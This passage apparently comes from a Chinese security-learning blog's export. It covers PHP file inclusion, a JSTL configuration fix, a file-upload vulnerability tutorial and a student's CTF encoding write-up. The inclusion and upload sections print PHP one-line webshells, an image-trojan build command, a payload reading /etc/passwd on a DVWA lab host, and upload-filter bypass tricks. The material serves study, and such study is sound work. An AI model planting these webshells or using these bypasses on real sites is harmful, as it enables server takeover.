<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建require_once.php文件，功能和require一样，但是只包含一次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-发生文件包含漏洞"><a href="#2-发生文件包含漏洞" class="headerlink" title="2.发生文件包含漏洞"></a>2.发生文件包含漏洞</h2><p>如果将require_once.php文件改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;This is require_once.php!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./inc.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/19/DK8jQH.jpg" alt="DK8jQH.jpg"></p>
<h2 id="3-四种函数总结"><a href="#3-四种函数总结" class="headerlink" title="3.四种函数总结"></a>3.四种函数总结</h2><div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>include()</td>
<td>当使用该函数包含文件时，只有代码执行到includ()函数时才会将文件包含进来，发生错误时给出一个警告，继续向下执行</td>
</tr>
<tr>
<td>include_once()</td>
<td>功能与include()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
</tr>
<tr>
<td>require()</td>
<td>require()与include()区别在于require()执行如果发生错误，函数就会输出错误信息，并终止脚本运行</td>
</tr>
<tr>
<td>require_once()</td>
<td>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</td>
</tr>
</tbody>
</table>
</div>
<h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>当别包含的文件在服务器本地</p>
<h2 id="2-远程文件包含漏洞"><a href="#2-远程文件包含漏洞" class="headerlink" title="2.远程文件包含漏洞"></a>2.远程文件包含漏洞</h2><p>当被包含的文件在第三方服务器本地</p>
<h1 id="文件包含漏洞产生原因"><a href="#文件包含漏洞产生原因" class="headerlink" title="文件包含漏洞产生原因"></a>文件包含漏洞产生原因</h1><h1 id="文件包含漏洞渗透"><a href="#文件包含漏洞渗透" class="headerlink" title="文件包含漏洞渗透"></a>文件包含漏洞渗透</h1><p>1.制作一句话图片木马</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">方法一：windows 命令：</span><br><span class="line"><span class="keyword">copy</span><span class="bash"> hack.jpg/b+shell.php hack.jpg</span></span><br><span class="line"></span><br><span class="line">方法二：使用edjpgcom</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">&quot;shell2.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php evla(#_POST[hack]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.上传木马图片文件</p>
<p>3.执行文件包含并生成后门</p>
<p>4.通过蚁剑连接</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>根据标记文件中的TLD或attribute指令</title>
    <url>/post/a0cc1c5.html</url>
    <content><![CDATA[<p>　　在做房租管理系统期间，访问出现以下错误，原来不是代码问题，而是IDEA的问题<span id="more"></span></p>
<p><strong>According to TLD or attribute directive in tag file, attribute items does not accept any expressions</strong></p>
<p><strong>解释：根据标记文件中的tld或attribute指令，attribute items不接受任何表达式**</strong></p>
<p>造成错误出现可能的原因：</p>
<p>web.xml文件中的版本号不兼容，有两种方法可解决。</p>
<h2 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h2><p><strong>修改导入jstl包的引入代码</strong><br> 将jsp文件中导入jstl包语句修改一下：<br> 修改前：<br> &lt;%@ taglib uri=“<a href="http://java.sun.com/jstl/core”">http://java.sun.com/jstl/core”</a> prefix=“c”%&gt;<br> 修改后：<br> &lt;%@ taglib uri=“<a href="http://java.sun.com/jstl/core_rt”">http://java.sun.com/jstl/core_rt”</a> prefix=“c”%&gt;</p>
<h2 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h2><p><strong>修改版本号</strong></p>
<p>　　主要修改在web-app中，我的版本兼容3.1的，自己可以新建一个Dynamic Web  Project，同时自动生成一个web.xml文件，将两个web.xml文件替换为自己新生成的web.xml中的web-app。新建项目时不会生成web.xml的看下图（新建项目时，一步一步来，最后一步时，将红圈处打上勾，就会自动生成web.xml了，生成的web.xml在WebContent\WEB-INF目录下）。</p>
<p><strong>修改前：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span></span><br><span class="line"><span class="tag"> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span></span><br><span class="line"><span class="tag"> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span>&gt;</span></span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<p><strong>修改后：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具使用问题</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/post/931c692.html</url>
    <content><![CDATA[<p>　　网站存在文件上传漏洞，以后开发项目如果不注意过滤文件上传的类型，很容易被攻击<span id="more"></span></p>
<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><p>asp的一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.eval使用php函数，例如phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">http:<span class="comment">//192.168.200.133/dvwa/hackable/uploads/shell.php?pass=phpinfo();</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#2.system使用linux系统命令，例如ls,cp,rm</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="comment">#_REQUEST[&#x27;pass&#x27;]);?&gt;</span></span><br><span class="line">             </span><br><span class="line">http:<span class="comment">//192.168.200.133/dvwa/hackable/uploads/shell.php?pass=cat /etc/passwd</span></span><br></pre></td></tr></table></figure>
<p>php的一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#说明REQUEST是在网页端输入变量访问，POST是使用像中国菜刀之类的工具链接</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><p>　　文件上传在Web业务中很常见，如用户上传头像、编写文章上传图片等在上传文件时候，未对上传得文件进行严格的验证和过滤，就有可能上传恶意的脚本文件、病毒、木马、webshell，从而控制网站甚至服务器。文件上传漏洞本身有很大的危害，webshell更是将这个漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。</p>
<h2 id="1-WebShell"><a href="#1-WebShell" class="headerlink" title="1.WebShell"></a>1.WebShell</h2><p>　　<strong>以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也叫作网页后门。</strong>这些文件与网站服务器web目录下正常网页文件混在一起，然后通过浏览器访问这些后门，得到一个命令执行环境，达到控制目的。</p>
<h2 id="2-web容器"><a href="#2-web容器" class="headerlink" title="2.web容器"></a>2.web容器</h2><p>　　是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tomcat、apache、nginx。</p>
<h1 id="造成文件上传漏洞的原因"><a href="#造成文件上传漏洞的原因" class="headerlink" title="造成文件上传漏洞的原因"></a>造成文件上传漏洞的原因</h1><p>​        1.对于上传的文件的后缀名没有做较为严格的限制</p>
<p>​        2.对于上传文件的MIMETYPE（用于描述文件的类型的一种表述方法）没有做检查</p>
<p>​        3.全线上没有对上传的文件目录设置不可执行权限</p>
<p>​        4.对于web server上传文件或者制定目录的行为没有做限制</p>
<h1 id="服务器解析存在的漏洞"><a href="#服务器解析存在的漏洞" class="headerlink" title="服务器解析存在的漏洞"></a>服务器解析存在的漏洞</h1><h2 id="1-IIS解析漏洞"><a href="#1-IIS解析漏洞" class="headerlink" title="1.IIS解析漏洞"></a>1.IIS解析漏洞</h2><p>IIS 6.0在解析文件时存在以下两个解析漏洞。</p>
<p>1.当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件来解析。</p>
<p>例如：建立文件夹parsing.asp，在parsing.asp文件夹内新建一个文本文档test.txt，其内容为&lt;%=NOW()%&gt;，然后在浏览器内访问。<br>“NOW()”是ASP提供获取当前时间的函数，TXT是文本文档格式，IIS是不会去解析此类文件的，应该会直接显示其内容，而在parsing.asp文件夹中，却被当作ASP脚本来解析。</p>
<p>2.当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行，如：新建文件test.asp;1.jpg，内容为&lt;%=NOW()%&gt;。</p>
<h2 id="2-apache解析漏洞"><a href="#2-apache解析漏洞" class="headerlink" title="2.apache解析漏洞"></a>2.apache解析漏洞</h2><p><strong>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</strong>如xxx.php.owf.rar ，”.owf”和”.rar”这两种后缀是apache解析不了的，apache就会把xxx.php.owf.rar解析成php。</p>
<p>有些程序开发人员在上传文件时，判断文件名是否是PHP、ASP、ASPX、ASA、CER、ASPX等脚本扩展名，如果是，则不允许上传，这时攻击者就有可能上传1.php.rar等扩展名来绕过程序检测，并配合解析漏洞，获取到WebShell。</p>
<p>在某些情况下，不只是php，就连<code>phtml</code>、<code>pht</code>、<code>php3</code>、<code>php4</code>和<code>php5</code>都是Apache和php认可的php程序的文件后缀。</p>
<h2 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3.Nginx解析漏洞"></a>3.Nginx解析漏洞</h2><p>1.Nginx版本：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Nginx</span> <span class="number">0</span>.<span class="number">5</span>.*</span><br><span class="line"><span class="attribute">Nginx</span> <span class="number">0</span>.<span class="number">6</span>.*</span><br><span class="line"><span class="attribute">Nginx</span> <span class="number">0</span>.<span class="number">7</span> &lt;= <span class="number">0</span>.<span class="number">7</span>.<span class="number">65</span></span><br><span class="line"><span class="attribute">Nginx</span> <span class="number">0</span>.<span class="number">8</span> &lt;= <span class="number">0</span>.<span class="number">8</span>.<span class="number">37</span></span><br></pre></td></tr></table></figure>
<p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求</p>
<p>2.Nginx版本：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Nginx</span> <span class="number">0</span>.<span class="number">8</span>.<span class="number">41</span> – <span class="number">1</span>.<span class="number">5</span>.<span class="number">6</span>：</span><br></pre></td></tr></table></figure>
<p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求</p>
<h1 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h1><h2 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h2><p>　　使用JavaScript检测，在文件未上传时（数据没有发送出去），就对文件进行验证。</p>
<p><strong>绕过方法</strong></p>
<p>1.使用FileBug浏览器插件</p>
<p>FireBug是删除客户端的JavaScript验证</p>
<p>2.BurpSuite代理工具</p>
<p>使用Burp Suite则是按照正常的流程通过JavaScript验证，然后<strong>在传输中的HTTP层做手脚。</strong><br>首先把木马文件扩展名改为一张正常图片的扩展名，比如JPG扩展名，在上传时使用Burp Suite拦截上传数据，再将其中的扩展名JPG修改为PHP，就可以绕过客户端验。</p>
<h2 id="2-服务器端检测"><a href="#2-服务器端检测" class="headerlink" title="2.服务器端检测"></a>2.服务器端检测</h2><p>服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法，甚至有些程序员检测文件中是否嵌入恶意代码。</p>
<h3 id="1-白名单与黑名单验证"><a href="#1-白名单与黑名单验证" class="headerlink" title="(1)白名单与黑名单验证"></a>(1)白名单与黑名单验证</h3><p>（1)黑名单过滤方法</p>
<p>规定不允许上传的文件扩展名，用户上传的文件与黑名单匹配，相同则拒绝上传。</p>
<p>（2）白名单过滤方式</p>
<p>规定允许上传的文件扩展名，用户上传的文件与白名单匹配，相同允许上传。<strong>白名单往往比黑名单更有效。</strong></p>
<h3 id="2-MIME验证（检测Content-Type）"><a href="#2-MIME验证（检测Content-Type）" class="headerlink" title="(2)MIME验证（检测Content-Type）"></a>(2)MIME验证（检测Content-Type）</h3><p><strong>MIME：</strong>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>在HTTP中，MIME类型被定义在Content-Type header中。</p>
<p>当用户上传文件到服务器端的时候，服务器端的程序会获取上传文件的MIME类型，然后用这个获取到的类型来和期望的MIME类型进行匹配，如果匹配不上则说明上传的文件不合法。</p>
<p><strong>1.绕过方法</strong></p>
<p>设置检测文件的类型，可以通过burpsuite来修改文件的类型进行过滤即可。</p>
<p>白名单的过滤方式与黑名单恰恰相反，黑名单是定义不允许上传的文件扩展名，而白名单则是定义允许上传的扩展名，白名单拥有比黑名单更好的防御机制。如：$WhiteList=array(rar’,jpg’,png,bmpy,gif,jpg；doc)；在获取到文件扩展名后对 WhiteList数组里的扩展名迭代判断，如果文件扩展名被命中，程序将认为文件是合法的，否则不允许上传。</p>
<p><strong>2.MIME验证</strong></p>
<p>MIME类型用来设定某种扩展名文件的打开方式，当具有该扩展名的文件被访问时，浏览器会自动使用指定的应用程序来打开。如GIF图片MIME为image/gif，CSS文件MIME类型为text/ess。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>文件后缀</th>
<th>Mime类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.flv</td>
<td>flv/flv-flash</td>
<td>在线播放</td>
</tr>
<tr>
<td>.html或.htm</td>
<td>text/html</td>
<td>超文本标记语言文本</td>
</tr>
<tr>
<td>.rtf</td>
<td>application/rtf</td>
<td>RTF文本</td>
</tr>
<tr>
<td>.gif</td>
<td>image/gif</td>
<td>GIF图形</td>
</tr>
<tr>
<td>.jpeg或.jpg</td>
<td>image/jpeg</td>
<td>JPEG图形</td>
</tr>
<tr>
<td>.au</td>
<td>audio/basic</td>
<td>au声音文件</td>
</tr>
<tr>
<td>.mid或.midi</td>
<td>audio/midi或audio/x-midi</td>
<td>MIDI音乐文件</td>
</tr>
<tr>
<td>.ra或.ram或.rm</td>
<td>audio/x-pn-realaudio</td>
<td>RealAudio音乐文件</td>
</tr>
<tr>
<td>.mpg或.mpeg或.mp3</td>
<td>video/mpeg</td>
<td>MPEG文件</td>
</tr>
<tr>
<td>.avi</td>
<td>video/x-msvideo</td>
<td>AVI文件</td>
</tr>
<tr>
<td>.gz</td>
<td>application/x-gzip</td>
<td>GZIP文件</td>
</tr>
<tr>
<td>.tar</td>
<td>application/x-tar</td>
<td>TAR文件</td>
</tr>
<tr>
<td>.exe</td>
<td>application/octet-stream</td>
<td>下载文件类型</td>
</tr>
<tr>
<td>.rmvb</td>
<td>video/vnd.rn-realvideo</td>
<td>在线播放</td>
</tr>
<tr>
<td>.txt</td>
<td>text/plain</td>
<td>普通文本</td>
</tr>
<tr>
<td>.mrp</td>
<td>application/octet-stream</td>
<td>MRP文件（国内普遍的手机）</td>
</tr>
<tr>
<td>.ipa</td>
<td>application/iphone-package-archive</td>
<td>IPA文件(IPHONE)</td>
</tr>
<tr>
<td>.deb</td>
<td>application/x-debian-package-archive</td>
<td>DED文件(IPHONE)</td>
</tr>
<tr>
<td>.apk</td>
<td>application/vnd.android.package-archive</td>
<td>APK文件(安卓系统)</td>
</tr>
<tr>
<td>.cab</td>
<td>application/vnd.cab-com-archive</td>
<td>CAB文件(Windows Mobile)</td>
</tr>
<tr>
<td>.xap</td>
<td>application/x-silverlight-app</td>
<td>XAP文件(Windows Phone 7)</td>
</tr>
<tr>
<td>.sis</td>
<td>application/vnd.symbian.install-archive</td>
<td>SIS文件(symbian平台)</td>
</tr>
<tr>
<td>.jar</td>
<td>application/java-archive</td>
<td>JAR文件(JAVA平台手机通用格式)</td>
</tr>
<tr>
<td>.jad</td>
<td>text/vnd.sun.j2me.app-descriptor</td>
<td>JAD文件(JAVA平台手机通用格式)</td>
</tr>
<tr>
<td>.sisx</td>
<td>application/vnd.symbian.epoc/x-sisx-app</td>
<td>SISX文件(symbian平台)</td>
</tr>
</tbody>
</table>
</div>
<h3 id="3-目录验证"><a href="#3-目录验证" class="headerlink" title="(3)目录验证"></a>(3)目录验证</h3><p>在文件上传时，程序通常允许用户将文件放到指定的目录中，然而有些Web开发人员为了让代码更“健壮”，通常会做一个操作，如果指定的目录存在，就将文件写入目录中，不存在则先建立目录，然后写入。</p>
<h3 id="4-0x00截断"><a href="#4-0x00截断" class="headerlink" title="(4)0x00截断"></a>(4)0x00截断</h3><p>因为PHP的底层代码是C语言，在C语言中，“\0”是字符串的结束符，如果用户能够传入“\0”，就能实现截断。</p>
<p>00截断绕过上传限制适用的场景为，后端先获取用户上传文件的文件名，如x.php\00.jpg，再根据文件名获得文件的实际后缀jpg；通过后缀的白名单校验后，最终在保存文件时发生截断，实现上传的文件为x.php。</p>
<p>当文件系统读到0x00时，会认为文件名已经结束。</p>
<p>创建一个名为file.php0x00.jpg的文件，但实际上创建的文件是file.php。</p>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>第一届DMCTF夺旗赛题解</title>
    <url>/post/f497d7e2.html</url>
    <content><![CDATA[<p>　　学网络安全，快一个月了，第一次参加的学校的网络安全比赛所做出来的题目<span id="more"></span></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-fakezip"><a href="#1-fakezip" class="headerlink" title="1.fakezip"></a>1.fakezip</h2><p>打开压缩包显示</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6LwZj.jpg" alt="D6LwZj.jpg" style="zoom:50%;" /></p>
<p>使用ZipCenOp解密</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6L0ds.jpg" alt="D6L0ds.jpg" style="zoom:50%;" /></p>
<p>打开压缩包里的文件查看是一串音乐符号</p>
<p>♬♬♬♭♬§¶♭♬♪♩♩♯=</p>
<p>使用以下网站解密</p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></p>
<h2 id="2-Base-family"><a href="#2-Base-family" class="headerlink" title="2.Base family"></a>2.Base family</h2><p>首先要了解<a href="/post/ba5852c2.html" title="常见的密码类型">常见的密码类型</a></p>
<p>打开见到是一串</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">XUZbB</span>&#123;fp&#125;U)=ql[n%GCbk<span class="number">9</span>RZ<span class="number">7</span>!XD$D)f<span class="number">1</span>G&#123;<span class="number">011</span>LN(TSlXCJT:<span class="number">4</span>nxQ[<span class="number">8</span>Y#I:=k.Qi<span class="number">4</span>t<span class="number">3</span>/S!,N/%[I&#125;^<span class="number">8</span>jjP|<span class="number">0</span>&amp;whvi<span class="number">88</span>gpQce(<span class="number">2</span>lKt<span class="number">9</span>ZHiT^g<span class="number">1</span>.nZH,k=kjTT<span class="number">16</span>pHJ_DrW,Td<span class="string">&quot;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;</span>duRBGj`g<span class="number">0</span>!I+xjm(fh)]IF:&gt;omN<span class="number">8</span>=m+Xp(X<span class="number">0</span>:U*<span class="number">8</span>Sj<span class="number">5</span>|<span class="number">8</span>p._o[i<span class="number">0</span>:%.qu&#125;%_=&lt;D</span><br></pre></td></tr></table></figure>
<p>这种类型是base91类型的编码，于是开始解码</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span><span class="name">G6</span>MzYGwFwTsqcb<span class="number">3</span>MWzTdQBTHZWBZ<span class="number">2</span>LUBprZ<span class="number">3</span>P<span class="number">62</span>T<span class="number">2</span><span class="symbol">nsbt1</span>R<span class="number">7</span><span class="meta">o6</span>a<span class="number">7</span>PEsXsB<span class="attr">vSFvoexeZJEkhW9</span>Wv<span class="number">1</span>VusvpWK<span class="number">1</span><span class="symbol">nfWsVHDypW2</span>j<span class="number">3</span>MMEygzSYLmwxKV<span class="number">5</span>k<span class="symbol">NwWomvXc5</span>ohX<span class="number">2</span>Jgj<span class="number">6</span>bMR<span class="symbol">nu6</span>JXkasXdbbw<span class="number">3</span>Aw<span class="number">8</span>Pvh<span class="number">6</span>vWwPfTZ<span class="number">4</span>mpkp<span class="symbol">NU9</span>fDhy<span class="symbol">Ni1</span>bciCZMXeLiCWL<span class="number">67</span>BVupHPobQcFWkpftgLPggB<span class="number">8</span>wgwW</span><br></pre></td></tr></table></figure>
<p>这里我卡了很长时间，我在网站上搜base家族的所有编码类型都不能解码，然后下载工具<a href="http://www.360doc.com/content/20/1003/09/11604731_938617176.shtml">basecrack</a>才通过base58解码得到</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">JZVFSMSZPJMXQTTKMMZ<span class="attr">VS2</span>TDGVGXUQJTJZKF<span class="name">M3</span>KO<span class="symbol">NJCTEWL2</span>M<span class="symbol">N4</span>U<span class="number">26</span>S<span class="symbol">NGJGVIWJQJZ5</span>GWMK<span class="number">2</span><span class="symbol">NJNGSTTNKV5</span>E<span class="number">2</span>RDDG<span class="symbol">NHFOWJTJZCFSNCNPJGTCWTKKF4</span>U<span class="number">42</span>SFG<span class="symbol">NGXUWJRJZVFSMSNKRNGWTL2</span>IUZFS<span class="number">6</span>TDGVHDEUJ<span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>然后继续base32解码</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="symbol">NjY2</span>YzYx<span class="symbol">Njc3</span>Yjc<span class="number">5</span>MzA<span class="number">3</span><span class="symbol">NTVmNjE2</span>YzcyMz<span class="name">M2</span>MTY<span class="number">0</span><span class="symbol">Nzk1</span>ZjZi<span class="symbol">NmUzMDc3</span><span class="symbol">NWY3</span><span class="symbol">NDY4</span>Mz<span class="name">M1</span>ZjQy<span class="symbol">NjE3</span>MzY<span class="number">1</span><span class="symbol">NjY2</span>MTZkMzE<span class="number">2</span>Yzc<span class="number">5</span><span class="symbol">N2</span>Q=</span><br></pre></td></tr></table></figure>
<p>继续base64解码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">666</span><span class="keyword">c</span><span class="number">61677</span>b<span class="number">7930755</span>f<span class="number">616</span><span class="keyword">c</span><span class="number">72336164795</span>f<span class="number">6</span>b<span class="number">6e30775</span>f<span class="number">7468335</span>f<span class="number">4261736566616</span>d<span class="number">316</span><span class="keyword">c</span><span class="number">797</span>d</span><br></pre></td></tr></table></figure>
<p>继续base16解码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;y<span class="number">0</span>u_alr<span class="number">3</span>ady_kn<span class="number">0</span>w_th<span class="number">3</span>_Basefam<span class="number">1</span>ly&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-编码之王"><a href="#3-编码之王" class="headerlink" title="3.编码之王"></a>3.编码之王</h2><p>打开显示的是一串社会主义价值观字符</p>
<p><a href="http://ctf.ssleye.com/cvencode.html">http://ctf.ssleye.com/cvencode.html</a></p>
<p>使用这个网址解码</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6OFOg.jpg" alt="D6OFOg.jpg" style="zoom:50%;" /></p>
<p>得到一串如是我闻什么的，继续使用</p>
<p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6Oi6S.jpg" alt="D6Oi6S.jpg" style="zoom:50%;" /></p>
<p>又得到新佛曰开头的字符串</p>
<p><a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a></p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6LzFI.jpg" alt="D6LzFI.jpg" style="zoom:50%;" /></p>
<p>最后控制台输入这段字符</p>
<p><img src="https://s3.ax1x.com/2020/11/29/D6OPl8.jpg" alt="D6OPl8.jpg" style="zoom:50%;" /></p>
<h2 id="4-SSTV"><a href="#4-SSTV" class="headerlink" title="4.SSTV"></a>4.SSTV</h2><p>先来看什么是sstv，百度搜索是：</p>
<p><strong>慢扫描电视</strong>（<strong>Slow-scan television</strong>）是<a href="https://baike.baidu.com/item/业余无线电">业余无线电</a>爱好者的一种主要图片传输方法，慢扫描电视通过<a href="https://baike.baidu.com/item/无线电">无线电</a>传输和接收单色或彩色静态图片。</p>
<p>首先要安装工具QSSTV</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install qsstv</span><br></pre></td></tr></table></figure>
<p>用qsstv打开文件，根据下图操作</p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgEEn.jpg" alt="DDgEEn.jpg" style="zoom:50%;" /></p>
<p>开始</p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgVNq.jpg" alt="DDgVNq.jpg" style="zoom:50%;" /></p>
<h2 id="5-SlientEye"><a href="#5-SlientEye" class="headerlink" title="5.SlientEye"></a>5.SlientEye</h2><p>使用工具slienteye，解码出来之后得到htmlentity字符，再解码得到flag</p>
<h2 id="6-Steghide"><a href="#6-Steghide" class="headerlink" title="6.Steghide"></a>6.Steghide</h2><p>在kali使用steghide工具</p>
<p>查看文件中的信息</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">steghide</span> <span class="literal">info</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgmCV.jpg" alt="DDgmCV.jpg"  /></p>
<p>输入密码后可以看到嵌入的flag.txt，提取图片中的隐藏文件</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">steghide extract -sf <span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/11/27/DDgZ40.jpg" alt="DDgZ40.jpg"  /></p>
<p><img src="https://s3.ax1x.com/2020/11/27/DDglDJ.jpg" alt="DDglDJ.jpg" style="zoom:50%;" /></p>
<p>但是并不知道这是什么意思，之后就没有思路了</p>
